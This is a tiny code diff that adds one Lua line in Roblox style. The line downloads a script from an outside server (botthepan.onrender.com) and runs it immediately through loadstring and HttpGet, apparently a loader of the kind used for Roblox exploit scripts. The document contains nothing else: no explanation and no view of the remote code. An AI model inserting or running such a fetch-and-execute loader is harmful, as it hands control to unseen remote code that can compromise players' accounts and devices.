@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://botthepan.onrender.com/script/a6e2c3eaca7dafce"))()
